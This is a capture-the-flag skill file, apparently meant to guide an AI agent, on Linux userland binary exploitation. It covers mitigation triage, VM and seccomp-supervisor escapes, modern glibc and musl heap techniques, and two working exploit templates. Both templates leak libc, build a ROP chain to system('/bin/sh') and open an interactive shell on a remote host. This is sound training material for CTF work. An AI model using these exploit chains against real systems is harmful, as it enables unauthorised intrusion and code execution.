---
name: ctf-pwn
description: >-
  Linux userland binary exploitation for CTF. Use when given an ELF binary (often
  with a remote "nc host port" and sometimes a libc) and the goal is a shell or
  flag via memory corruption. Covers checksec triage, pwntools skeleton, ret2win,
  ROP, format string, GOT/PLT overwrite, ret2libc with a leak, heap/tcache, plus
  modern targets: custom-VM / interpreter escapes (OOB into the native frame),
  seccomp user-notification supervisor escapes, musl 1.2.5 / glibc 2.42, and
  solving without pwntools (raw sockets / freestanding C). Tools: pwntools,
  gdb+pwndbg, ROPgadget, ropper, one_gadget, libc-database. Triggers on: "pwn",
  "exploit", "buffer overflow", "BOF", "ret2win", "ROP", "ret2libc", "format
  string", "GOT", "PLT", "canary", "checksec", "pwntools", "one_gadget", "stack
  overflow", "shellcode", "tcache", "VM escape", "interpreter", "bytecode VM",
  "Piet", "Lua", "WASM", "wasm", "seccomp", "seccomp-notify", "supervisor",
  "musl", "FILE vtable", "leakless", "glibc 2.42", "kernel", "LPE", "no pwntools",
  "raw socket", "FSOP", "House of Apple", "safe linking", "process_vm_readv",
  "process_vm_writev".
---

# CTF Pwn — Linux Userland Exploitation

### Tools & Setup (Arch Linux)
Check `command -v` first (honoring "Install Nothing Silently"):
```bash
command -v gdb || sudo pacman -S gdb python-pwntools radare2
command -v pwndbg || paru -S pwndbg ropgadget ropper one_gadget-git libc-database-git seccomp-tools
command -v lua || sudo pacman -S lua
command -v npiet || paru -S npiet
```

### Reference Documentation & Toolkits
- **Custom VM / Interpreter Escapes**: [`references/vm_escape.md`](references/vm_escape.md) — Dispatch analysis, stack layout diagrams, bounds elision, SP aliasing, leakless ROP
- **Modern Libc & Musl Exploitation**: [`references/modern_libc_musl.md`](references/modern_libc_musl.md) — Glibc 2.34–2.42 FSOP (House of Apple 2), Safe Linking math, Musl 1.2.5 `FILE->write` function pointer overwrite
- **Seccomp Supervisor Escapes**: [`references/seccomp_supervisor.md`](references/seccomp_supervisor.md) — `SECCOMP_RET_USER_NOTIF`, 32-bit integer truncation in emulated I/O, `process_vm_readv/writev` parent R/W, GOT hijacking
- **Freestanding / No-Pwntools Toolkit**: [`references/raw_socket.py`](references/raw_socket.py) — Standalone pure-Python Tube, cyclic generator/finder, flat struct packing, safe linking, freestanding C stub
- **GDB & Pwndbg Workflow**: [`references/gdb_pwndbg.md`](references/gdb_pwndbg.md) — Breakpoints, memory inspection, heap exploration, stack alignment
- **Pwntools Skeleton Template**: [`template.py`](template.py) — Standard exploit boilerplate with local, GDB, and remote dispatch

---

## Decision Tree

When triaging a binary exploitation challenge, map observed binaries and clues to the primary attack vector:

| Clue / Stack / Observation | Vulnerability Class | Primary Technique | Reference / Tool |
| :--- | :--- | :--- | :--- |
| **Custom interpreter, bytecode VM** (Piet, LattiaVM, Lua 5.5, WASM) | Interpreter / VM Escape | OOB from VM operand stack array into native frame; SP aliasing; leakless ROP | `references/vm_escape.md` |
| **Parent/Child process + `seccomp_notify`** | Seccomp Supervisor Escape | 32-bit integer truncation in emulated I/O; `process_vm_readv/writev` parent R/W | `references/seccomp_supervisor.md` |
| **Glibc 2.34–2.42**, Full RELRO, Heap | Post-Hook Heap Exploitation | Safe Linking unmangling + FSOP (House of Apple 2 / `_IO_wfile_jumps`) | `references/modern_libc_musl.md` §3 |
| **Musl 1.2.5** target (static or dynamic) | Musl Allocator / FILE Hook | Overwrite direct function pointer `stdout->write` at `stdout+0x28`; RWX module patching | `references/modern_libc_musl.md` §5 |
| **No pwntools installed / allowed** | Freestanding Exploitation | Raw socket `Tube`, De Bruijn `cyclic_find`, freestanding C raw-syscall stub | `references/raw_socket.py` |
| **Classic Stack BOF**, no canary, non-PIE | ret2win / ROP | Cyclic offset to saved RIP, 16-byte stack alignment bare `ret`, call `win` / system | `template.py` |
| **Format string** (`printf(buf)`) | Stack / Binary Leak & Overwrite | `%p` / `%N$p` to defeat ASLR/canary; `%n` / `fmtstr_payload` for GOT / pointer overwrite | pwntools `fmtstr` |
| **Glibc 2.31 or older**, Partial RELRO | Legacy Heap Poisoning | Double-free → tcache poisoning → overwrite `__free_hook` with `system` | pwntools heap |

---

## Step 1 — Checksec & Mitigation Triage

```bash
file ./chall
checksec --file=./chall            # or: pwn checksec ./chall
```

| Mitigation | Off State → | On State → | Modern Mitigations (2025–2026) |
| :--- | :--- | :--- | :--- |
| **Canary** | Direct stack smash | Leak canary (`%p`, partial read) or avoid (overwrite adjacent struct fields, loop counters) | Compiler stack protector |
| **NX** | Direct shellcode injection | ROP / ret2libc / `mprotect` chain | W^X memory protection |
| **PIE** | Fixed addresses, hardcoded gadgets | Need leak to compute ELF base | 2-byte partial overwrite of saved RIP |
| **RELRO** | Partial: GOT writable (`fclose@GOT` → `fflush`) | Full: GOT read-only; use ret2libc, FSOP, or `FILE` struct | Dynamic relocation hardening |
| **Safe Linking** | Direct forward pointer (`fd`) overwrite | Pointers mangled with `ptr ^ (pos >> 12)` | Glibc 2.32–2.42 tcache/fastbin protection |
| **Seccomp** | All syscalls allowed | Blocked syscalls (`execve`) | User-Notification supervisor emulation |
| **SHSTK / IBT** | Unrestricted ROP / indirect calls | Hardware shadow stack validates RET targets | CET (Control-flow Enforcement) |

Find the bug and offsets:
```bash
python3 references/raw_socket.py --test                                  # verify local tooling
python3 -c "import sys; sys.path.insert(0, 'references'); from raw_socket import cyclic; print(cyclic(200).decode())"
ROPgadget --binary ./chall | grep -E 'pop rdi|pop rsi|pop rdx|ret$|syscall'
strings ./chall | grep -iE '/bin/sh|flag|cat'
```

---

## Step 2 — Modern Exploit Archetypes

### 1. Custom VM / Interpreter Escapes
See full methodology and stack diagrams in [`references/vm_escape.md`](references/vm_escape.md).
1. **Reverse Dispatch Table**: Locate opcode handler table or computed goto switch.
2. **Find Bounds Check Elision**:
   - Unchecked `PUSH` or `DUP` past array capacity (e.g. `stack[256]` aliases `vm.sp` or `saved_rbp`).
   - Incomplete negative bounds (e.g. `roll` checks `depth <= 0` but fails to check `depth <= sp`).
3. **Control Native Frame**:
   - Overwrite `vm.sp` to relocate the virtual stack over the native return address.
   - Or overwrite low byte/dword of native saved `RBP` to execute a `leave; ret` stack pivot.
4. **Leakless ROP**: Assemble compact 128-byte chains (`pop rax; ret` → `system` → `mov rdi, rsp; call rax; "pr f*"`).

### 2. Seccomp User-Notification Supervisor Escapes
See architecture and freestanding C payload in [`references/seccomp_supervisor.md`](references/seccomp_supervisor.md).
1. **Identify Supervisor**: Parent process receives notifications via `SECCOMP_IOCTL_NOTIF_RECV` and emulates I/O using `process_vm_readv` / `process_vm_writev`.
2. **Trigger 32-bit Integer Wrap**: Pass `offset = 0xFFFFFFFF` and `count = 8` to wrap 32-bit arithmetic (`offset + count < MAX`) while kernel evaluates full 64-bit addresses.
3. **Supervisor Arbitrary R/W**: Read and write into supervisor memory space.
4. **Defeat ASLR**: Memory scan pages using non-crashing `process_vm_readv` (returns `EFAULT`).
5. **GOT Overwrite**: Overwrite supervisor `strlen@GOT` with `system`, then trigger emulated call with `"/bin/sh"`.

### 3. Modern Libc (glibc 2.34–2.42) & Musl 1.2.5
See complete FSOP and Musl internals in [`references/modern_libc_musl.md`](references/modern_libc_musl.md).
- **Glibc 2.32+ Safe Linking**: Decrypt pointers using `safe_unlink(mangled, pos)` or leak heap base from single tcache entry (`0 ^ (pos >> 12)`).
- **Glibc 2.34–2.42 FSOP**: Hooks are gone. Construct House of Apple 2 fake `_IO_FILE` setting `vtable = _IO_wfile_jumps`, `_wide_data` with controlled `_wide_vtable->__doallocate = system`, triggered on `exit()`.
- **Musl 1.2.5**: No tcache. Corrupt direct embedded function pointer `stdout->write` (located at `stdout + 0x28` / `0x48`), set buffer to `"/bin/sh"`, and trigger via `exit()` or `printf()`.

---

## Step 3 — Freestanding Exploitation (No Pwntools)

When solving in environments where pwntools cannot be installed, use [`references/raw_socket.py`](references/raw_socket.py):

```python
from references.raw_socket import Tube, p64, u64, flat, cyclic_find, ROPBuilder

io = Tube("challenge.ctf.org", 1337)

# Receive prompt and leak
io.recv_until(b"Leak: ")
libc_leak = int(io.recv_line().strip(), 16)
libc_base = libc_leak - 0x29D90

# Build ROP chain without pwntools
rop = ROPBuilder(base=libc_base)
rop.ret(0x29139)                        # bare ret for 16-byte alignment
rop.call(
    func=libc_base + 0x50D70,           # system()
    rdi=libc_base + 0x1D8678,           # "/bin/sh"
    pop_rdi=libc_base + 0x2A3E5         # pop rdi; ret
)

payload = flat({
    40: rop.chain()
})

io.send_line_after(b"Enter payload: ", payload)
io.interactive()
```

For zero-dependency raw syscall payloads in C, compile static freestanding binaries:
```bash
gcc -nostdlib -static -no-pie -fno-stack-protector exploit.c -o exploit
```

---

## Step 4 — Standard Pwntools Boilerplate

```python
from pwn import *
exe = context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False) if os.path.exists("./libc.so.6") else exe.libc
context.terminal = ["tmux", "splitw", "-h"]

io = process(exe.path)                  # io = remote("host", 1337)
off = 40                                # find via cyclic

# Leak libc base via puts(got.puts) -> return to main
rop = ROP(exe)
rop.puts(exe.got.puts)
rop.call(exe.sym.main)
io.sendlineafter(b":", b"A" * off + rop.chain())

leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts
log.success("Libc base: %#x", libc.address)

# Final payload: system("/bin/sh")
rop2 = ROP(libc)
rop2.raw(rop2.ret)                      # 16-byte stack alignment
rop2.system(next(libc.search(b"/bin/sh\x00")))
io.sendlineafter(b":", b"A" * off + rop2.chain())
io.interactive()
```

---

## Common Gotchas & Edge Cases

1. **16-Byte Stack Alignment**: On x86-64, `$rsp` must be 16-byte aligned (`$rsp & 0xf == 0`) before a `call` instruction. Misalignment causes a `movaps` crash inside `do_system`. Add a bare `ret` gadget before `system()`.
2. **Buffer Flush Before Exit**: When targeting `FILE` structures or partial RELRO GOT overwrites (`fclose@GOT` → `fflush`), ensure file buffers are flushed before process exit.
3. **Payload Truncation**: `scanf("%s")` stops at whitespace (`0x20`, `0x09`, `0x0a`); `gets()` stops at `0x0a`; `read()` allows arbitrary binary payloads with null bytes.
4. **Stale Stack Re-use**: In custom VM / interpreter escapes, use stale stack values rather than demanding a separate memory leak.
